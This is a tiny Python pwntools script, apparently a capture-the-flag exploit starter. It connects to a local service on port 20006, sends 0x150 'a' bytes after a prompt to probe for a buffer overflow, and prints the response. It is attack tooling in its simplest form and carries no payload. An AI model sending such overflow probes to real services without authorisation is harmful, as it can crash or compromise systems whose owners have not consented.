from pwn import *

REMOTE = False

HOST = ''
PORT = 0

if REMOTE:
    io = remote(HOST, PORT)
else:
    io = remote('localhost', 20006)

io.sendlineafter('> ', 'a'*0x150)

print(io.recv().decode())